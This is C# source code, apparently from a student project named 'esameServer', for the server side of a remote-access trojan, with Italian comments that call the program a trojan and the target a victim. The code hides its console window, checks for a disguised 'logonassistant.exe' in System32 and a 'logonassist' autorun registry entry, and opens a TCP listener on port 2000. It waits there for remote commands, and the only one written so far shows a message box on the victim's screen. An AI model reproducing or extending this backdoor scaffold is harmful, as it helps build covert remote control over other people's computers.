using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace esameServer
{
    class Program
    {
        public static NetworkStream Receiver;
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();

        public static void Receive()//metodo che prova a leggere i dati mandati
        {
            while (true)
            {
                try
                {
                    //array che contiene i dati ricevuti
                    byte[] RecPacket = new byte[1000];

                    //leggo il comando inviato
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    Receiver.Flush();

                    //converto da byte a stringa
                    string Command = Encoding.ASCII.GetString(RecPacket);

                    //divido il comando col separatore scelto >>>
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, ">>>");

                    //Get the actual command.
                    Command = CommandArray[0];

                    //è lo switch dei comandi, ne posso aggiungere anche altri
                    switch (Command)
                    {
                        case "MESSAGE":
                            //ottengo il messaggio
                            string Msg = CommandArray[1];
                            //mostro il messaggio nel pc della vittima
                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));
                            break;
                    }
                }
                catch
                {
                    //smetto di leggere i dati ed esco dal ciclo
                    break;
                }

            }
        }

        public static bool CheckIfRan()
        {
            bool IsRan = false;
            //controllo se il trojan c'è in System32
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"))
            {
                //controllo, se è nel registro
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                //se "logonassist" esiste in startup
                if (k.GetValue("logonassist") != null)
                {
                    IsRan = true;
                }
                else
                {
                    IsRan = false;
                }
            }
            return IsRan;
        }

        static void Main(string[] args)
        {
            //nascondi il prompt
            FreeConsole();

            //controllo se il programma è già partito
            bool Check = CheckIfRan();

            //se non è già partito lo faccio partire
            if (!Check)
            {
                //in ascolto per la connessione 
                TcpListener l = new TcpListener(2000);
                l.Start();

                //accetto la connessione
                TcpClient Connection = l.AcceptTcpClient();

                //ricevo lo stream
                Receiver = Connection.GetStream();

                //lancio il thread del metodo Receive
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));
                Rec.Start();
            }

        }
    }
}
